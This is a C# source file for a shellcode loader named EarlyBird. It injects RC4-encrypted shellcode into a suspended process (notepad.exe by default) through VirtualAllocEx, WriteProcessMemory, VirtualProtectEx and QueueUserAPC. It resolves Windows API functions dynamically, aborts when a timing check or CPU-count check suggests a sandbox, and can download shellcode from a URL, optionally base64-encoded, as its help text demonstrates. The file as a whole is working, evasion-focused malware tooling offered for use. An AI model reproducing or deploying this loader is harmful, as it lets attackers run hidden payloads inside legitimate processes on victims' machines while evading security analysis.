using System;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using Dn.Ivk;
using static EarlyBird.STRUCTURES;

namespace EarlyBird
{
    public class DELEGATE
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr QueueUserAPC(
            IntPtr pfnAPC,
            IntPtr hThread,
            IntPtr dwData);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint ResumeThread(IntPtr hThread);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool CloseHandle(IntPtr hProcess);
    }
    public class STRUCTURES
    {
        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public ushort wProcessorArchitecture;
            public ushort wReserved;
            public uint dwPageSize;
            public IntPtr lpMinimumApplicationAddress;
            public IntPtr lpMaximumApplicationAddress;
            public IntPtr dwActiveProcessorMask;
            public uint dwNumberOfProcessors;
            public uint dwProcessorType;
            public uint dwAllocationGranularity;
            public ushort wProcessorLevel;
            public ushort wProcessorRevision;
        }

        public struct Rc4Context
        {
            public uint i, j;
            public byte[] s;
        }
    }
    public class Program
    {
        private static string DEFAULT_PROCESS = @"C:\\Windows\\System32\\notepad.exe";
        private static uint MEM_COMMIT = 0x1000;
        private static uint MEM_RESERVE = 0x2000;
        private static uint PAGE_READWRITE = 0x04;
        private static uint PAGE_EXECUTE_READ = 0x20;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32", SetLastError = true)]
        public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        static void rc4Init(ref Rc4Context context, byte[] key, int length)
        {
            uint i, j;
            byte temp;

            if (key == null || key.Length == 0)
            {
                throw new ArgumentException("Invalid parameters");
            }

            context.i = 0;
            context.j = 0;

            context.s = new byte[256];
            for (i = 0; i < 256; i++)
            {
                context.s[i] = (byte)i;
            }

            for (i = 0, j = 0; i < 256; i++)
            {
                j = (uint)((j + context.s[i] + key[i % length]) % 256);

                temp = context.s[i];
                context.s[i] = context.s[j];
                context.s[j] = temp;
            }
        }
        static void rc4Cipher(ref Rc4Context context, byte[] input, byte[] output, int length)
        {
            byte temp;

            uint i = context.i;
            uint j = context.j;
            byte[] s = context.s;

            for (int k = 0; k < length; k++)
            {
                i = (i + 1) % 256;
                j = (j + s[i]) % 256;

                temp = s[i];
                s[i] = s[j];
                s[j] = temp;

                output[k] = (byte)(input[k] ^ s[(s[i] + s[j]) % 256]);
            }
        }
        static bool CPUCheck()
        {
            var sysinfo = new SYSTEM_INFO();

            GetSystemInfo(out sysinfo);
            if (sysinfo.dwNumberOfProcessors < 3)
            {
                return true;
            }

            return false;
        }

        public static void Main(string[] args)
        {
            IntPtr Pointer;
            string process = DEFAULT_PROCESS;

            if (args.Length < 2)
            {
                PrintHelp();
                return;
            }

            var arguments = ParseArgs(args.ToList());
            if (arguments == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(3000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 3)

            {

                return;

            }

            if (CPUCheck())
            {
                Console.WriteLine("\t> Possible VM/Sandbox Detected... Aborting Execution.");
                return;
            }

            if (arguments.processPath != null)
            {
                process = arguments.processPath;
                Console.WriteLine("\t> Target Process: {0}", process);
            }
            else
            {
                Console.WriteLine("\t> No Executable Path Given As Argument (Using Dafault {0})", DEFAULT_PROCESS);
            }

            byte[] Key = {
                0x3f, 0x0e, 0x78, 0xed, 0x00, 0x21, 0x34, 0xaf, 0x9e, 0xbf, 0x0f, 0xc8,
                0xf6, 0xf1, 0x29, 0x1f, 0xae, 0x00, 0xb4, 0x48, 0xf9, 0xf9, 0xfe, 0xcd,
                0x08, 0x7f, 0xc0, 0xd2, 0x91, 0x6c, 0x93, 0x4c
            };

            byte[] Data = arguments.bytes;

            STARTUPINFO         si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            Pointer = Gen.GetLibAddrs("kernel32.dll", "CreateProcessA");
            DELEGATE.CreateProcess createProcess = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATE.CreateProcess)) as DELEGATE.CreateProcess;
            bool createStatus = createProcess(process, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            if (!createStatus)
            {
                Console.WriteLine("\t> CreateProcessA - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> CreateProcessA - OK");
                Console.WriteLine("\t> PID: {0}", pi.dwProcessId);
            }

            Pointer = Gen.GetLibAddrs("kernel32.dll", "VirtualAllocEx");
            DELEGATE.VirtAllocEx virtAllocEx = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATE.VirtAllocEx)) as DELEGATE.VirtAllocEx;
            IntPtr alloc = virtAllocEx(pi.hProcess, IntPtr.Zero, (uint)Data.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (alloc == IntPtr.Zero)
            {
                Console.WriteLine("\t> VirtualAllocEc - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> VirtualAllocEx - OK");
                Console.WriteLine("\t> Memory Address At: 0x" + alloc.ToString("X"));
            }

            Console.WriteLine("\t> Decrypting Shellcode");

            Rc4Context context = new Rc4Context();
            rc4Init(ref context, Key, Key.Length);
            byte[] RawData = new byte[Data.Length];
            rc4Cipher(ref context, Data, RawData, Data.Length);

            IntPtr lpNumberOfBytesWritten;
            Pointer = Gen.GetLibAddrs("kernel32.dll", "WriteProcessMemory");
            DELEGATE.WriteProcMemory writeProcMemory = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATE.WriteProcMemory)) as DELEGATE.WriteProcMemory;
            bool writeStatus = writeProcMemory(pi.hProcess, alloc, RawData, RawData.Length, out lpNumberOfBytesWritten);

            if (!writeStatus)
            {
                Console.WriteLine("\t> WriteProcessMemory - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> WriteProcessMemory - OK");
            }

            uint lpflOldProtect;
            Pointer = Gen.GetLibAddrs("kernel32.dll", "VirtualProtectEx");
            DELEGATE.VirtProtectEx virtProtectEx = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATE.VirtProtectEx)) as DELEGATE.VirtProtectEx;
            bool protectStatus = virtProtectEx(pi.hProcess, alloc, (UIntPtr)RawData.Length, PAGE_EXECUTE_READ, out lpflOldProtect);

            if (!protectStatus)
            {
                Console.WriteLine("\t> VirtualProtectEx - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> VirtualProtectEx - OK");
            }

            Pointer = Gen.GetLibAddrs("kernel32.dll", "QueueUserAPC");
            DELEGATE.QueueUserAPC queueUserAPC = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATE.QueueUserAPC)) as DELEGATE.QueueUserAPC;
            IntPtr apc = queueUserAPC(alloc, pi.hThread, IntPtr.Zero);

            if (apc == IntPtr.Zero)
            {
                Console.WriteLine("\t> QueueUserAPC - Failed");
                return;
            }
            else
            {
                Console.WriteLine("\t> QueueUserAPC - OK");
            }

            Pointer = Gen.GetLibAddrs("kernel32.dll", "ResumeThread");
            DELEGATE.ResumeThread resumeThread = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATE.ResumeThread)) as DELEGATE.ResumeThread;
            resumeThread(pi.hThread);

            Console.WriteLine("\t> DONE !");

            Pointer = Gen.GetLibAddrs("kernel32.dll", "CloseHandle");
            DELEGATE.CloseHandle closeHandle = Marshal.GetDelegateForFunctionPointer(Pointer, typeof(DELEGATE.CloseHandle)) as DELEGATE.CloseHandle;
            closeHandle(pi.hProcess);
            closeHandle(pi.hThread);
        }

        private static Arguments ParseArgs(List<string> args)
        {
            string filename = null;
            string processPath = null;
            byte[] data = null;
            WebClient cli = new WebClient();

            if (args.Contains("-shellcode"))
            {
                filename = args[args.IndexOf("-shellcode") + 1];

                if (filename.StartsWith("http://") || filename.StartsWith("https://"))
                {
                    data = cli.DownloadData(filename);
                }
                else if (filename.StartsWith("base64:http://") || filename.StartsWith("base64:https://"))
                {
                    data = Convert.FromBase64String(cli.DownloadString(filename.Substring(7, filename.Length - 7)));
                }
                else
                {
                    data = File.ReadAllBytes(filename);
                }
            }
            else
            {
                PrintHelp();
                return null;
            }

            if (args.Contains("-process"))
            {
                processPath = args[args.IndexOf("-process") + 1];
            }

            return new Arguments {bytes = data, processPath = processPath };
        }
        private static void PrintHelp()
        {
            Console.WriteLine($"\nUsage [1]: Passing the shellcode locally and using the default process: C:\\Windows\\System32\\notepad.exe");
            Console.WriteLine($"\te.g. EarlyBird.exe -shellcode <shellcode-file>");
            Console.WriteLine($"\te.g. EarlyBird.exe -shellcode C:\\Users\\user\\Desktop\\shellcode.sc \n");
            Console.WriteLine($"Usage [2]: Passing the shellcode remotely and using the default process: C:\\Windows\\System32\\notepad.exe");
            Console.WriteLine($"\te.g. EarlyBird.exe -shellcode <url>");
            Console.WriteLine($"\te.g. EarlyBird.exe -shellcode https://example.com/shellcode.sc \n");
            Console.WriteLine($"Usage [3]: Passing the base64 encoded shellcode remotely and using the default process: C:\\Windows\\System32\\notepad.exe");
            Console.WriteLine($"\te.g. EarlyBird.exe -shellcode base64:<url>");
            Console.WriteLine($"\te.g. EarlyBird.exe -shellcode base64:https://example.com/shellcode.txt \n");
            Console.WriteLine($"[i] You can change the target process by passing the -process flag to any of the three ways to run EarlyBird.exe");
            Console.WriteLine($"\te.g. EarlyBird.exe -shellcode base64:https://example.com/shellcode.txt -process C:\\Windows\\System32\\Wbem\\WmiPrvSE.exe \n");
        }

        internal class Arguments
        {
            internal string processPath;
            internal byte[] bytes;
        }
    }
}
